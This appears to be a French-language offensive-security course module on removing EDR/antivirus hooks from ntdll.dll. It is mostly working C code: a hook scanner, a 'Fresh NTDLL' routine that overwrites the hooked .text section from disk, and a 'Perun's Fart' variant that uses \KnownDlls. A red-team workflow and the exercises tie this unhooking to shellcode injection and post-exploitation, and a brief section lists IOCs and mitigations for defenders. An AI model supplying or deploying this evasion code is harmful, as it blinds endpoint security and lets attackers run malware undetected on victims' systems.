# Module W31 : Unhooking - Suppression des Hooks EDR/AV

## Objectifs

À la fin de ce module, vous serez capable de :
- Comprendre comment les EDR/AV hookent les fonctions système
- Détecter la présence de hooks userland
- Restaurer ntdll.dll à son état "clean" (fresh NTDLL)
- Implémenter des syscalls directs pour bypasser les hooks

## 1. Introduction au Hooking et Unhooking

### 1.1 Qu'est-ce qu'un hook userland ?

**Analogie** : Imaginez une route entre votre maison et le centre-ville (syscall vers le kernel). Un EDR installe un péage (hook) sur cette route pour inspecter tous les véhicules. L'unhooking consiste à créer une route alternative ou à supprimer le péage.

**Comment fonctionnent les hooks EDR** :
```
Application malveillante
         │
         ├─► NtAllocateVirtualMemory  ◄─── Nous voulons appeler cette fonction
         │         │
         │         ├─ [HOOK EDR!]  ◄────── EDR a modifié les premiers octets
         │         │   │
         │         │   ├─► Analyse sécurité
         │         │   ├─► Logging
         │         │   └─► Décision : Bloquer/Autoriser
         │         │
         │         └─► syscall (si autorisé)
         │                   │
         │                   └─► ntoskrnl.exe (kernel)
```

### 1.2 Types de hooks

**1. Inline Hooking (trampolines)** :
```
NTDLL.DLL - Version originale (clean)
┌────────────────────────────────┐
│ NtAllocateVirtualMemory:       │
│   mov r10, rcx                 │  ◄─ Instructions originales
│   mov eax, 0x18                │
│   syscall                      │
│   ret                          │
└────────────────────────────────┘

NTDLL.DLL - Version hookée (EDR)
┌────────────────────────────────┐
│ NtAllocateVirtualMemory:       │
│   jmp 0x7FFE12345678  ◄────────┼─ HOOK! Jump vers l'EDR
│   [octets écrasés]             │
│   syscall                      │
│   ret                          │
└────────────────────────────────┘
         │
         └─► Code EDR (analyse + log)
               │
               └─► Retour à l'instruction originale
```

**2. IAT Hooking** :
Modification de l'Import Address Table pour rediriger les appels de fonction.

**3. SSDT Hooking** (Kernel-mode) :
Modification de la System Service Descriptor Table (hors scope de ce module).

## 2. Détection des Hooks

### 2.1 Méthode 1 : Vérification des premiers octets

```c
#include <windows.h>
#include <stdio.h>

// Opcodes attendus pour le début d'un syscall natif (x64)
// Exemple : NtAllocateVirtualMemory commence généralement par:
// 4C 8B D1    mov r10, rcx
// B8 XX 00 00 00    mov eax, syscall_number

BOOL IsHooked(PVOID functionAddress) {
    BYTE* pFunction = (BYTE*)functionAddress;

    // Vérifie si la fonction commence par un JMP (0xE9) ou PUSH+RET
    if (pFunction[0] == 0xE9 ||          // jmp rel32
        pFunction[0] == 0xEB ||          // jmp short
        pFunction[0] == 0xFF ||          // jmp [rip+X]
        pFunction[0] == 0x68) {          // push (trampoline)
        printf("[!] Hook détecté : Jump/Trampoline à l'adresse 0x%p\n",
               functionAddress);
        return TRUE;
    }

    // Vérifie le pattern attendu : mov r10, rcx
    if (pFunction[0] != 0x4C ||
        pFunction[1] != 0x8B ||
        pFunction[2] != 0xD1) {
        printf("[!] Hook potentiel : Pattern inattendu à 0x%p\n",
               functionAddress);
        return TRUE;
    }

    return FALSE;
}

// Teste plusieurs fonctions critiques
void ScanForHooks() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    const char* functions[] = {
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx",
        "NtWriteVirtualMemory",
        "NtQueueApcThread",
        NULL
    };

    printf("[*] Scan des hooks dans ntdll.dll\n");

    for (int i = 0; functions[i] != NULL; i++) {
        FARPROC pFunc = GetProcAddress(hNtdll, functions[i]);
        if (pFunc) {
            printf("[*] %s : ", functions[i]);
            if (IsHooked(pFunc)) {
                printf("HOOKÉ\n");
            } else {
                printf("CLEAN\n");
            }
        }
    }
}
```

### 2.2 Méthode 2 : Comparaison avec ntdll.dll sur disque

```c
#include <windows.h>
#include <stdio.h>

BOOL CompareWithDiskCopy(LPCSTR functionName) {
    // 1. Récupérer l'adresse de la fonction en mémoire
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pFuncMem = GetProcAddress(hNtdll, functionName);

    // 2. Ouvrir ntdll.dll depuis le disque
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Erreur ouverture ntdll.dll: %d\n", GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID fileBuffer = malloc(fileSize);

    DWORD bytesRead = 0;
    ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    // 3. Parser le PE pour trouver la fonction
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(
        (PBYTE)fileBuffer + pDosHeader->e_lfanew
    );

    // 4. Trouver l'export de la fonction
    IMAGE_DATA_DIRECTORY exportDir =
        pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(
        (PBYTE)fileBuffer + exportDir.VirtualAddress
    );

    DWORD* addressOfFunctions = (DWORD*)((PBYTE)fileBuffer +
                                pExportDir->AddressOfFunctions);
    DWORD* addressOfNames = (DWORD*)((PBYTE)fileBuffer +
                                pExportDir->AddressOfNames);
    WORD* addressOfNameOrdinals = (WORD*)((PBYTE)fileBuffer +
                                pExportDir->AddressOfNameOrdinals);

    // 5. Chercher la fonction par nom
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* name = (char*)((PBYTE)fileBuffer + addressOfNames[i]);
        if (strcmp(name, functionName) == 0) {
            WORD ordinal = addressOfNameOrdinals[i];
            DWORD rva = addressOfFunctions[ordinal];
            PVOID pFuncDisk = (PBYTE)fileBuffer + rva;

            // 6. Comparer les 32 premiers octets
            BOOL hooked = (memcmp(pFuncMem, pFuncDisk, 32) != 0);

            if (hooked) {
                printf("[!] %s est HOOKÉ\n", functionName);
                printf("    Mémoire: ");
                for (int j = 0; j < 16; j++)
                    printf("%02X ", ((BYTE*)pFuncMem)[j]);
                printf("\n    Disque:  ");
                for (int j = 0; j < 16; j++)
                    printf("%02X ", ((BYTE*)pFuncDisk)[j]);
                printf("\n");
            }

            free(fileBuffer);
            return hooked;
        }
    }

    free(fileBuffer);
    return FALSE;
}
```

## 3. Technique d'Unhooking : Fresh NTDLL Copy

### 3.1 Principe

**Concept** : Remplacer la section .text hookée de ntdll.dll en mémoire par une copie propre depuis le disque.

```
ÉTAPE 1: État initial
┌─────────────────────────┐
│ ntdll.dll (en mémoire)  │
│ ├─ .text (HOOKÉ)  ◄─────┼─ EDR a modifié cette section
│ ├─ .data               │
│ └─ .rdata              │
└─────────────────────────┘

ÉTAPE 2: Charger ntdll.dll depuis le disque
┌─────────────────────────┐
│ ntdll.dll (disque)      │
│ ├─ .text (CLEAN) ◄──────┼─ Version originale
│ ├─ .data               │
│ └─ .rdata              │
└─────────────────────────┘

ÉTAPE 3: Remplacer .text en mémoire
┌─────────────────────────┐
│ ntdll.dll (en mémoire)  │
│ ├─ .text (CLEAN) ◄──────┼─ Copié depuis le disque
│ ├─ .data               │
│ └─ .rdata              │
└─────────────────────────┘
```

### 3.2 Implémentation

```c
#include <windows.h>
#include <stdio.h>

BOOL UnhookNtdll() {
    printf("[*] Démarrage Unhooking de ntdll.dll\n");

    // 1. Récupérer le handle de ntdll en mémoire
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Erreur GetModuleHandle(ntdll)\n");
        return FALSE;
    }

    printf("[+] ntdll.dll chargé à: 0x%p\n", hNtdll);

    // 2. Mapper ntdll.dll depuis le disque en mémoire
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Erreur CreateFile: %d\n", GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID fileBuffer = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE);

    if (!fileBuffer) {
        printf("[-] Erreur VirtualAlloc: %d\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL)) {
        printf("[-] Erreur ReadFile: %d\n", GetLastError());
        VirtualFree(fileBuffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);
    printf("[+] ntdll.dll lu depuis le disque (%d octets)\n", bytesRead);

    // 3. Parser les headers PE
    PIMAGE_DOS_HEADER pDosHeaderMem = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNtHeadersMem = (PIMAGE_NT_HEADERS)(
        (PBYTE)hNtdll + pDosHeaderMem->e_lfanew
    );

    PIMAGE_DOS_HEADER pDosHeaderDisk = (PIMAGE_DOS_HEADER)fileBuffer;
    PIMAGE_NT_HEADERS pNtHeadersDisk = (PIMAGE_NT_HEADERS)(
        (PBYTE)fileBuffer + pDosHeaderDisk->e_lfanew
    );

    // 4. Trouver la section .text
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeadersMem);

    for (WORD i = 0; i < pNtHeadersMem->FileHeader.NumberOfSections; i++) {
        char sectionName[9] = { 0 };
        memcpy(sectionName, pSectionHeader[i].Name, 8);

        if (strcmp(sectionName, ".text") == 0) {
            printf("[+] Section .text trouvée\n");

            // Adresse de .text en mémoire
            PVOID textSectionMem = (PBYTE)hNtdll + pSectionHeader[i].VirtualAddress;
            SIZE_T textSize = pSectionHeader[i].Misc.VirtualSize;

            printf("    Adresse mémoire: 0x%p\n", textSectionMem);
            printf("    Taille: %zu octets\n", textSize);

            // Trouver .text dans le fichier sur disque
            PIMAGE_SECTION_HEADER pSectionHeaderDisk = IMAGE_FIRST_SECTION(pNtHeadersDisk);
            PVOID textSectionDisk = NULL;

            for (WORD j = 0; j < pNtHeadersDisk->FileHeader.NumberOfSections; j++) {
                char diskSectionName[9] = { 0 };
                memcpy(diskSectionName, pSectionHeaderDisk[j].Name, 8);

                if (strcmp(diskSectionName, ".text") == 0) {
                    textSectionDisk = (PBYTE)fileBuffer +
                                     pSectionHeaderDisk[j].PointerToRawData;
                    break;
                }
            }

            if (!textSectionDisk) {
                printf("[-] Section .text introuvable sur disque\n");
                VirtualFree(fileBuffer, 0, MEM_RELEASE);
                return FALSE;
            }

            // 5. Changer les permissions de .text en RWX
            DWORD oldProtect = 0;
            if (!VirtualProtect(textSectionMem, textSize,
                               PAGE_EXECUTE_READWRITE, &oldProtect)) {
                printf("[-] Erreur VirtualProtect: %d\n", GetLastError());
                VirtualFree(fileBuffer, 0, MEM_RELEASE);
                return FALSE;
            }

            printf("[+] Permissions modifiées (RWX)\n");

            // 6. Copier .text propre depuis le disque vers la mémoire
            memcpy(textSectionMem, textSectionDisk, textSize);
            printf("[+] Section .text restaurée depuis le disque\n");

            // 7. Restaurer les permissions originales
            VirtualProtect(textSectionMem, textSize, oldProtect, &oldProtect);
            printf("[+] Permissions restaurées\n");

            VirtualFree(fileBuffer, 0, MEM_RELEASE);
            printf("[+] Unhooking réussi !\n");
            return TRUE;
        }
    }

    printf("[-] Section .text non trouvée\n");
    VirtualFree(fileBuffer, 0, MEM_RELEASE);
    return FALSE;
}

int main() {
    printf("=== Unhooking Tool ===\n\n");

    // Scanner les hooks
    ScanForHooks();

    printf("\n");

    // Unhook ntdll
    if (UnhookNtdll()) {
        printf("\n[*] Rescanning après unhooking...\n");
        ScanForHooks();
    }

    return 0;
}
```

## 4. Technique Avancée : Perun's Fart (Fresh NTDLL via Section)

**Avantage** : Évite de lire ntdll.dll depuis le disque (moins d'IOC).

```c
BOOL PerunsFart() {
    printf("[*] Perun's Fart Unhooking\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    // 1. Créer une section depuis ntdll.dll (pas le fichier)
    // Utilise KnownDlls pour obtenir une copie clean
    HANDLE hSection = NULL;
    NTSTATUS status;

    typedef NTSTATUS (NTAPI *pNtOpenSection)(
        PHANDLE SectionHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes
    );

    pNtOpenSection NtOpenSection = (pNtOpenSection)GetProcAddress(
        hNtdll, "NtOpenSection"
    );

    // 2. Ouvrir la section \KnownDlls\ntdll.dll
    UNICODE_STRING usSectionName;
    RtlInitUnicodeString(&usSectionName, L"\\KnownDlls\\ntdll.dll");

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &usSectionName, 0, NULL, NULL);

    status = NtOpenSection(&hSection, SECTION_MAP_READ, &objAttr);

    if (status != 0) {
        printf("[-] Erreur NtOpenSection: 0x%08X\n", status);
        return FALSE;
    }

    printf("[+] Section KnownDlls\\ntdll.dll ouverte\n");

    // 3. Mapper la section en mémoire
    typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
        HANDLE SectionHandle,
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        SIZE_T CommitSize,
        PLARGE_INTEGER SectionOffset,
        PSIZE_T ViewSize,
        DWORD InheritDisposition,
        ULONG AllocationType,
        ULONG Win32Protect
    );

    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)
        GetProcAddress(hNtdll, "NtMapViewOfSection");

    PVOID cleanNtdll = NULL;
    SIZE_T viewSize = 0;

    status = NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &cleanNtdll,
        0,
        0,
        NULL,
        &viewSize,
        1,  // ViewShare
        0,
        PAGE_READONLY
    );

    if (status != 0) {
        printf("[-] Erreur NtMapViewOfSection: 0x%08X\n", status);
        CloseHandle(hSection);
        return FALSE;
    }

    printf("[+] ntdll.dll clean mappé à: 0x%p\n", cleanNtdll);

    // 4. Copier .text depuis la copie clean
    PIMAGE_DOS_HEADER pDosClean = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS pNtClean = (PIMAGE_NT_HEADERS)(
        (PBYTE)cleanNtdll + pDosClean->e_lfanew
    );

    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtClean);

    for (WORD i = 0; i < pNtClean->FileHeader.NumberOfSections; i++) {
        char sectionName[9] = { 0 };
        memcpy(sectionName, pSectionHeader[i].Name, 8);

        if (strcmp(sectionName, ".text") == 0) {
            PVOID textClean = (PBYTE)cleanNtdll + pSectionHeader[i].VirtualAddress;
            PVOID textHooked = (PBYTE)hNtdll + pSectionHeader[i].VirtualAddress;
            SIZE_T textSize = pSectionHeader[i].Misc.VirtualSize;

            DWORD oldProtect;
            VirtualProtect(textHooked, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(textHooked, textClean, textSize);
            VirtualProtect(textHooked, textSize, oldProtect, &oldProtect);

            printf("[+] .text restauré (%zu octets)\n", textSize);
            break;
        }
    }

    // Cleanup
    typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
        HANDLE ProcessHandle,
        PVOID BaseAddress
    );

    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)
        GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    NtUnmapViewOfSection(GetCurrentProcess(), cleanNtdll);
    CloseHandle(hSection);

    printf("[+] Perun's Fart unhooking réussi\n");
    return TRUE;
}
```

## 5. Applications Offensives

### 5.1 Workflow Red Team

```
1. Reconnaissance
   ├─► Détection des hooks (ScanForHooks)
   └─► Identification de l'EDR/AV

2. Unhooking
   ├─► Fresh NTDLL (unhook complet)
   └─► ou Syscalls directs (bypass complet)

3. Exécution du payload
   ├─► Injection de code
   ├─► Shellcode execution
   └─► Post-exploitation
```

### 5.2 Comparaison des méthodes

```
Technique           │ Stealth │ Complexité │ Fiabilité │ Détection
────────────────────┼─────────┼────────────┼───────────┼───────────
Fresh NTDLL (disk)  │   ★★★   │     ★★     │   ★★★★★   │  Moyenne
Perun's Fart        │  ★★★★   │    ★★★     │   ★★★★    │  Faible
Syscalls directs    │ ★★★★★   │   ★★★★★    │   ★★★     │Très Faible
```

## 6. Détection et Mitigations

**IOCs pour les défenseurs** :
1. Lectures de ntdll.dll depuis C:\Windows\System32
2. Appels à NtOpenSection sur \KnownDlls\ntdll.dll
3. Modifications de la section .text de ntdll (VirtualProtect)
4. Divergences de hash .text après le démarrage

**Mitigations EDR** :
- Kernel-mode hooks (SSDT) impossible à unhook depuis userland
- ETW monitoring des syscalls
- Callback notifications kernel
- Attestation continue de l'intégrité de ntdll

## 7. Checklist de maîtrise

- [ ] Je comprends comment fonctionnent les hooks inline
- [ ] Je sais détecter les hooks via pattern matching
- [ ] Je peux comparer ntdll mémoire vs disque
- [ ] Je maîtrise Fresh NTDLL unhooking
- [ ] Je connais Perun's Fart technique
- [ ] Je comprends les limitations de l'unhooking
- [ ] Je sais quand utiliser syscalls directs à la place

## Exercices

Voir [exercice.md](exercice.md) pour :
1. Développer un scanner de hooks complet
2. Implémenter Fresh NTDLL unhooking
3. Créer un outil Perun's Fart
4. Combiner unhooking + injection de shellcode

---

**Navigation**
- [Module précédent : W30 Inline Hooking](../W30_inline_hooking/)
- [Module suivant : W32 Reflective DLL](../W32_reflective_dll/)
